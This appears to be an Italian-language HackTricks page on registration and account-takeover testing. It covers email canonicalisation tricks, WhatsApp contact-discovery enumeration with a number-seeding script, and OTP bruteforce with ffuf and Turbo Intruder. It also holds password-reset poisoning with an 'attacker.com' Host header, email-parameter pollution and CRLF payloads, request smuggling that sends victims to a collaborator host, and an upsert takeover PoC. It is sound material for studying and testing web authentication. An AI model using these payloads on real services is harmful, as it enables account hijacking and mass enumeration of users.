# Vulnerabilità di Registrazione e Takeover

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Registrazione duplicata

- Prova a generare usando uno username già esistente
- Controlla variando l'email:
- uppsercase
- +1@
- aggiungi qualche punto nell'email
- caratteri speciali nel nome dell'email (%00, %09, %20)
- Metti caratteri vuoti dopo l'email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Prova trick di canonicalizzazione del provider email (dipende dal servizio):
- Gmail ignora i punti e lo subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` vengono recapitati a `victim@gmail.com`
- Alcuni provider sono case-insensitive nella local-part
- Alcuni provider accettano unicode confusables. Prova omoglifi e soft hyphen `\u00AD` nella local-part
- Abusa di questi per: bypassare i controlli di unicità, ottenere account duplicati/inviti workspace, o bloccare le registrazioni della vittima (DoS temporaneo) mentre prepari un takeover

### Username Enumeration

Verifica se puoi capire quando uno username è già stato registrato all'interno dell'applicazione.

- Messaggi di errore o HTTP status code differenti
- Differenze di timing (l'utente esistente può innescare lookup verso IdP/DB)
- Autofill del form di registrazione con i dati del profilo per email conosciute
- Controlla i flow team/invite: inserire un'email può rivelare se un account esiste

### Password Policy

Durante la creazione di un utente verifica la politica delle password (controlla se puoi usare password deboli).\
In tal caso puoi tentare un bruteforce delle credenziali.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)per imparare come tentare takeover di account o estrarre informazioni tramite **SQL Injections** nei form di registrazione.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Una volta registrato prova a cambiare l'email e verifica se questa modifica è correttamente validata o se è possibile impostarla su email arbitrarie.

### Altri controlli

- Verifica se puoi usare **disposable emails** (mailinator, yopmail, 1secmail, etc.) o bypassare la blocklist con subaddressing come `victim+mailinator@gmail.com`
- **Long** **password** (>200) porta a **DoS**
- **Controlla i rate limits sulla creazione degli account**
- Usa username@**burp_collab**.net e analizza il **callback**
- Se è usata la verifica del numero di telefono, verifica edge case di parsing/injection dei numeri

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

I messenger centrati sul numero di telefono espongono un **presence oracle** ogni volta che il client sincronizza i contatti. Replayando le richieste di discovery di WhatsApp storicamente si ottenevano **>100M lookups per hour**, permettendo enumerazioni quasi complete degli account.

Attack workflow

1. **Instrument an official client** per catturare la richiesta di upload della rubrica (blob autenticato di numeri normalizzati E.164). Replayala con numeri generati dall'attaccante riutilizzando gli stessi cookies/device token.
2. **Batch numbers per request**: WhatsApp accetta migliaia di identificatori e restituisce registered/unregistered più metadata (business, companion, etc.). Analizza le risposte offline per costruire liste di target senza messaggiare le vittime.
3. **Scale orizzontalmente** l'enumerazione con SIM banks, cloud devices, o residential proxies in modo che il throttling per-account/IP/ASN non venga mai innescato.

Modellazione del piano di numerazione

Modella il piano di numerazione di ogni paese per saltare candidati invalidi. L'NDSS dataset (`country-table.*`) elenca i country code, adoption density e platform split così puoi dare priorità alle range con alto hit-rate. Esempio di codice di seeding:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Dare priorità ai prefissi che corrispondono ad allocazioni reali (Mobile Country Code + National Destination Code) prima di interrogare l'oracle per mantenere utile il throughput.

**Trasformare le enumerazioni in attacchi mirati**

- Alimentare numeri di telefono leaked (e.g., Facebook’s 2021 breach) nell'oracle per scoprire quali identità sono ancora attive prima di phishing, SIM-swapping, o spamming.
- Suddividere i censimenti per country/OS/tipo di app per trovare regioni con filtri SMS deboli o forte adozione di WhatsApp Business per social engineering localizzato.

**Correlazione del riutilizzo delle chiavi pubbliche**

WhatsApp espone la X25519 identity key di ogni account durante il session setup. Richiedi materiale d'identità per ogni numero enumerato e deduplica le chiavi pubbliche per rivelare account farms, client clonati o firmware insicuro—le chiavi condivise deanonymize operazioni multi-SIM.

## Verifica debole Email/Phone (OTP/Magic Link)

I flussi di registrazione spesso verificano la proprietà tramite un OTP numerico o un token magic-link. Difetti tipici:

- OTP prevedibile o corto (4–6 cifre) senza rate limiting efficace o IP/device tracking. Provare guess paralleli e rotazione di header/IP.
- Riutilizzo dell'OTP tra azioni o account, o non vincolato all'utente/azione specifica (e.g., lo stesso codice funziona per login e signup, o funziona dopo il cambio email).
- Multi-value smuggling: alcuni backend accettano più codici e verificano se uno corrisponde. Provare:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguere wrong vs expired vs wrong-user codes tramite status/message/body length.
- Token non invalidati dopo il successo o dopo il cambio password/email.
- Verification token non legato a user agent/IP permettendo completion cross-origin da attacker-controlled pages.

Esempio di Bruteforcing con ffuf contro un JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Tentativi paralleli/concorrenti per aggirare i blocchi sequenziali (usa Turbo Intruder in Burp):

<details>
<summary>Snippet di Turbo Intruder per inondare tentativi di OTP a 6 cifre</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

A powerful class of issues occurs when an attacker performs actions on the victim’s email before the victim creates their account, then regains access later.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
- all other sessions and tokens are invalidated,
- pending email/phone change capabilities are cancelled,
- previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaccante deve effettuare il login con il proprio account e andare alla funzionalità **Change password**.
2. Avvia Burp Suite e intercetta la richiesta
3. Invia la richiesta al tab repeater e modifica i parametri : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Il password reset token dovrebbe essere generato in modo casuale e unico ogni volta.\
Prova a determinare se il token scade o se è sempre lo stesso; in alcuni casi l'algoritmo di generazione è debole e può essere indovinato. Le seguenti variabili potrebbero essere usate dall'algoritmo.

- Timestamp
- UserID
- Email dell'utente
- Nome e Cognome
- Data di nascita
- Crittografia
- Solo numeri
- Sequenza di token corta ( caratteri tra \[A-Z,a-z,0-9])
- Riutilizzo del token
- Data di scadenza del token

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Ispeziona la risposta del server e verifica la presenza di `resetToken`
3. Poi usa il token in un URL come `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrati sul sistema con uno username identico a quello della vittima, ma con spazi inseriti prima e/o dopo lo username. e.g: `"admin "`
2. Richiedi un password reset con il tuo username maligno.
3. Usa il token inviato alla tua email e resetta la password della vittima.
4. Accedi all'account della vittima con la nuova password.

La piattaforma CTFd era vulnerabile a questo attacco.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trova una XSS dentro l'applicazione o in un sottodominio se i cookie sono scoped al dominio padre : `*.domain.com`
2. Leak il cookie di sessione corrente **sessions cookie**
3. Autenticati come l'utente usando il cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Usa **smuggler** per rilevare il tipo di HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Crea una richiesta che sovrascriva il `POST / HTTP/1.1` con i seguenti dati:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` con l'obiettivo di aprire un redirect delle vittime verso burpcollab e rubare i loro cookie\
3. La richiesta finale potrebbe apparire come la seguente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone segnala lo sfruttamento di questo bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crea un payload per il CSRF, e.g: “HTML form with auto submit for a password change”
2. Invia il payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Modifica il JWT con un altro User ID / Email
- Verifica la presenza di una firma JWT debole


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Alcuni signup handler eseguono un upsert quando l'email fornita esiste già. Se l'endpoint accetta un body minimale con un'email e una password e non impone la verifica di proprietà, inviare l'email della vittima sovrascriverà la sua password pre-auth.

- Discovery: raccogli i nomi degli endpoint dal JS incluso (o dal traffico dell'app mobile), poi fuzz i base paths come /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Suggerimenti sul metodo: una GET che restituisce messaggi come "Only POST request is allowed." spesso indica il verbo corretto e che viene atteso un body JSON.
- Body minimo osservato in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Esempio PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impatto: Full Account Takeover (ATO) senza alcun reset token, OTP o verifica via email.

## Riferimenti

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
